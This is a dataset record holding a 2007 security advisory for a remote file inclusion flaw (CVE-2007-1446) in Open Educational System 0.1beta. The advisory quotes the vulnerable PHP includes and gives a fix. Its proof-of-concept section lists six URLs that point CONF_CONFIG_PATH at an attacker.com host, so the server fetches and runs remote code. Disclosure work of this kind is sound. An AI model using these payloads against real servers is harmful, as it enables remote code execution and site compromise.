{
  "id": "3465",
  "title": "OES (Open Educational System) 0.1beta - Remote File Inclusion",
  "cve": "CVE-2007-1446",
  "vuln_type": "rce",
  "code": "____________________   ___ ___ ________\r\n\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\  \r\n |    __)_ /    \\  \\//    ~    \\/   |   \\ \r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n        \\/         \\/       \\/         \\/ \r\n\r\n                                        .OR.ID\r\nECHO_ADV_69$2007\r\n\r\n-----------------------------------------------------------------------------------------\r\n[ECHO_ADV_69$2007] OES (Open Educational System) 0.1beta Remote File Inclusion Vulnerability\r\n-----------------------------------------------------------------------------------------\r\n\r\nAuthor         : M.Hasran Addahroni\r\nDate           : March, 12th 2007\r\nLocation       : Australia, Sydney\r\nWeb            : http://advisories.echo.or.id/adv/adv69-K-159-2007.txt\r\nCritical Lvl   : Dangerous\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication   : Open Educational System \r\nversion       : 0.1beta\r\nVendor        : http://openeducation.sourceforge.net\r\nDescription :\r\n\r\nOES (Open Educational System) which is a free for use, open source, and multi-platform, multi-language and user-friendy design online e-learning platform.\r\nThe system is integrate and suitable use for any high-school, college or university\r\n\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~~\r\n- Invalid include function at includes/lib-account.inc.php :  \r\n  \t\r\n----------------includes/lib-account.inc.php-------------------\r\n<?php\r\n\t// File        : /include/lib-account.inc.php\r\n\t//\r\n\t// Description : This library is for administrator and normal user account mangement.\r\n\r\n\r\n\t// Include the configuration file.\r\n\tinclude_once ( $CONF_CONFIG_PATH.'/config.inc.php' );\r\n\r\n\t// Include the main include file for running all routine.\r\n\tinclude_once ( $CONF_INCLUDE_PATH.'/library.inc.php' );\r\n\r\n\t// Include the ADOdb Class\r\n\tinclude_once ( $CONF_INCLUDE_PATH.'/adodb/adodb.inc.php');\r\n\r\n...\r\n----------------------------------------------------------------\r\n\r\n\r\nVariables $CONF_INCLUDE_PATH is not properly sanitized.\r\nWhen register_globals=on and allow_fopenurl=on an attacker can exploit this vulnerability with a simple php injection script.\r\n\r\nalso affected files :\r\n\r\n\r\nincludes/lib-file.inc.php\r\nincludes/lib-group.inc.php\r\nincludes/lib-log.inc.php\r\nincludes/lib-mydb.inc.php\r\nincludes/lib-template-mod.inc.php\r\nincludes/lib-themes.inc.php\r\n\r\nPoc/Exploit:\r\n~~~~~~~~~~\r\n\r\nhttp://www.target.com/[OES_path]/includes/lib-account.inc.php?CONF_CONFIG_PATH=http://attacker.com/evil?\r\nhttp://www.target.com/[OES_path]/includes/lib-group.inc.php?CONF_CONFIG_PATH=http://attacker.com/evil?\r\nhttp://www.target.com/[OES_path]/includes/lib-log.inc.php?CONF_CONFIG_PATH=http://attacker.com/evil?\r\nhttp://www.target.com/[OES_path]/includes/lib-mydb.inc.php?CONF_CONFIG_PATH=http://attacker.com/evil?\r\nhttp://www.target.com/[OES_path]/includes/lib-template-mod.inc.php?CONF_CONFIG_PATH=http://attacker.com/evil?\r\nhttp://www.target.com/[OES_path]/includes/lib-themes.inc.php?CONF_CONFIG_PATH=http://attacker.com/evil?\r\n\r\n\r\nSolution:\r\n~~~~~~~\r\n\r\n- Sanitize variable $CONF_INCLUDE_PATH on affected files.\r\n- Turn off register_globals\r\n\r\n---------------------------------------------------------------------------\r\n\r\nShoutz:\r\n~~~~~\r\n~ ping - my dearest wife, and my little son, for all the luv the tears n the breath\r\n~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,negative, str0ke (for the best comments)\r\n~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,an0maly,fleanux,baylaw\r\n~ SinChan,h4ntu,cow_1seng,sakitjiwa, m_beben, rizal, cR4SH3R, madkid, kuntua, stev_manado, nofry, x16\r\n~ newbie_hacker@yahoogroups.com\r\n~ #aikmel #e-c-h-o @irc.dal.net\r\n\r\n---------------------------------------------------------------------------\r\nContact:\r\n~~~~~~\r\n\r\n     K-159 || echo|staff || eufrato[at]gmail[dot]com\r\n     Homepage: http://k-159.echo.or.id/\r\n\r\n-------------------------------- [ EOF ] ----------------------------------\r\n\r\n# milw0rm.com [2007-03-12]",
  "url": "https://www.exploit-db.com/exploits/3465"
}